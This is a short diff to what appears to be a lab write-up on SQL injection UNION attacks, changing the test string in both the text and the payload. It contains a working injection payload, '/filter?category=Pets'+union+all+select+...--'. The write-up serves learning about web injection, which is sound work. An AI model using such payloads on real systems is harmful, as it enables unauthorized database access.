@@ -40,10 +40,10 @@ Also, that there are 3 columns returned by the query and we can do a UNION attac
 <img width="1522" height="807" alt="3" src="https://github.com/user-attachments/assets/a77d6d12-b21a-43db-9059-0b88ecf4a35d" />
 
 
-We can print the string Qrc0Pq setting this string in the second value of the attack:
+We can print the string 2Ae75f setting this string in the second value of the attack:
 
 ```
-/filter?category=Pets'+union+all+select+'0','Qrc0Pq','123'--
+/filter?category=Pets'+union+all+select+'0','2Ae75f','123'--
 ```
 
 
